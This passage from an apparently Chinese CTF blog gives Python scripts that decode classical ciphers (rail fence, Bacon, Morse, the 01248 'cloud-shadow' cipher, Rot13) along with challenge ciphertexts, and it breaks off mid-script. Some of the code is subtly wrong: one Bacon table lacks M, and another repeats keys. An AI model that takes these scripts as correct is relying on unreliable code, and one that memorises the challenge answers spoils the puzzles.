fence(rng, n)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(text[pos.index(n)] <span class="keyword">for</span> n <span class="keyword">in</span> rng)</span><br><span class="line"></span><br><span class="line">z = <span class="string">&quot;ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">10</span>):</span><br><span class="line">    y = decode(z,i)</span><br><span class="line">    <span class="keyword">print</span> y</span><br></pre></td></tr></table></figure><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig1</span>(<span class="params">m</span>):</span></span><br><span class="line">    basic1 = &#123;</span><br><span class="line">    <span class="string">&#x27;AAAAA&#x27;</span> : <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAAAB&#x27;</span> : <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABA&#x27;</span> : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABB&#x27;</span> : <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAA&#x27;</span> : <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAB&#x27;</span> : <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBA&#x27;</span> : <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBB&#x27;</span> : <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAB&#x27;</span> : <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABA&#x27;</span> : <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABB&#x27;</span> : <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAB&#x27;</span> : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBA&#x27;</span> : <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBB&#x27;</span> : <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAA&#x27;</span> : <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAB&#x27;</span> : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABA&#x27;</span> : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAA&#x27;</span> : <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAB&#x27;</span> : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBA&#x27;</span> : <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBB&#x27;</span> : <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BBAAA&#x27;</span> : <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BBAAB&#x27;</span> : <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        temp = m[i: i + <span class="number">5</span>]</span><br><span class="line">        output += basic1[temp]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig2</span>(<span class="params">m</span>):</span></span><br><span class="line">    basic2 = &#123;</span><br><span class="line">    <span class="string">&#x27;AAAAA&#x27;</span> : <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAAAB&#x27;</span> : <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABA&#x27;</span> : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABB&#x27;</span> : <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAA&#x27;</span> : <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAB&#x27;</span> : <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBA&#x27;</span> : <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBB&#x27;</span> : <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAB&#x27;</span> : <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABA&#x27;</span> : <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABB&#x27;</span> : <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAA&#x27;</span> : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAB&#x27;</span> : <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBA&#x27;</span> : <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBB&#x27;</span> : <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAA&#x27;</span> : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAB&#x27;</span> : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABA&#x27;</span> : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAA&#x27;</span> : <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAB&#x27;</span> : <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBA&#x27;</span> : <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBB&#x27;</span> : <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        temp = m[i: i + <span class="number">5</span>]</span><br><span class="line">        output += basic2[temp]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = <span class="string">&quot;aaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba&quot;</span></span><br><span class="line">    mode = <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> len(m)%<span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        l = []</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(m)/<span class="number">5</span>):</span><br><span class="line">            l.append(m[:<span class="number">5</span>])</span><br><span class="line">            m = m[<span class="number">5</span>:]</span><br><span class="line">        <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    k.append(peig1(i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = i.upper()</span><br><span class="line">                    k.append(peig1(i))</span><br><span class="line">        <span class="keyword">elif</span> mode == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    k.append(peig2(i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = i.upper()</span><br><span class="line">                    k.append(peig2(i))</span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">            flag+=i[<span class="number">0</span>]</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;aaaaa&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaaab&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaaba&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaabb&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aabaa&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aabab&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aabba&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aabbb&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abaaa&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abaab&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ababa&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ababb&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abbaa&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abbab&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abbba&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abbbb&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;baaaa&#x27;</span>:<span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;baaab&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;baaba&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;baabb&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;babaa&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;babab&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;babba&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;babbb&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bbaaa&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bbaab&#x27;</span>:<span class="string">&#x27;z&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">dict2 = &#123;<span class="string">&#x27;.-&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-...&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-.&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-.&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.&#x27;</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....&#x27;</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.---&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-..&#x27;</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--&#x27;</span>: <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--.&#x27;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.-&#x27;</span>: <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.&#x27;</span>: <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-&#x27;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...-&#x27;</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--&#x27;</span>: <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-&#x27;</span>: <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--..&#x27;</span>: <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.----&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..---&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...--&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....-&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.....&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--...&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---..&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;----.&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-----&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27; &#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">enc_str0=<span class="string">&quot;--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dec_str=<span class="string">&quot;&quot;</span></span><br><span class="line">enc_str2=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">enc_str1=enc_str0.split(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc_str1:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    enc_str2 += dict2[i]</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">print(enc_str2)</span><br><span class="line">enc_str2=enc_str2.split(<span class="string">&quot;hhhh&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc_str2)/<span class="number">5</span>):</span><br><span class="line">    dec_str += dict1[enc_str2[:<span class="number">5</span>]]</span><br><span class="line">    enc_str2=enc_str2[<span class="number">5</span>:]</span><br><span class="line">print(dec_str)</span><br></pre></td></tr></table></figure><h2 id="云影密码"><a href="#云影密码" class="headerlink" title="云影密码"></a>云影密码</h2><p>加密方式仅使用01248这5种数字来进行，其中0用来唯一表示间隔，其他数字用加法和表示替换密文。再使用数字1<del>26表示字母A</del>Z。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">steady_dic=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">steady_str=<span class="string">&quot;8842101220480224404014224202480122&quot;</span></span><br><span class="line">steady_str=steady_str.split(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    steady_sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        steady_sum+=int(j)</span><br><span class="line">        <span class="keyword">if</span> steady_sum &gt; <span class="number">26</span>:</span><br><span class="line">            steady_sum=steady_sum%<span class="number">26</span></span><br><span class="line">    print(steady_sum<span class="number">-1</span>)</span><br><span class="line">    steady_flag+=steady_dic[steady_sum<span class="number">-1</span>]</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h2 id="Rot13"><a href="#Rot13" class="headerlink" title="Rot13"></a>Rot13</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">steady_dic=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">steady_dic1=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">print(steady_dic1)</span><br><span class="line">steady_str=<span class="string">&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_num=<span class="number">13</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    <span class="keyword">if</span> ord(<span class="string">&#x27;a&#x27;</span>) &lt;= ord(i) <span class="keyword">and</span> ord(i) &lt;= ord(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        num=steady_dic1.index(i)+<span class="number">1</span>+steady_num</span><br><span class="line">        <span class="keyword">if</span> num &gt; <span class="number">26</span>:</span><br><span class="line">            num=num%<span class="number">26</span></span><br><span class="line">        print(num)</span><br><span class="line">        steady_flag+=steady_dic1[num<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">elif</span> ord(<span class="string">&#x27;A&#x27;</span>) &lt;= ord(i) <span class="keyword">and</span> ord(i) &lt;= ord(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        num=steady_dic.index(i)+<span class="number">1</span>+steady_num</span><br><span class="line">        <span class="keyword">if</span> num &gt; <span class="number">26</span>:</span><br><span class="line">            num=num%<span class="number">26</span></span><br><span class="line">        print(num)</span><br><span class="line">        steady_flag+=steady_dic[num<span class="number">-1</span>]   </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        steady_flag+=i</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h2 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;</span><br></pre></td></tr></table></figure><h2 id="轮转机加密"><a href="#轮转机加密" class="headerlink" title="轮转机加密"></a>轮转机加密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">steady_str=<span class="string">&#x27;&#x27;&#x27;1: &lt; 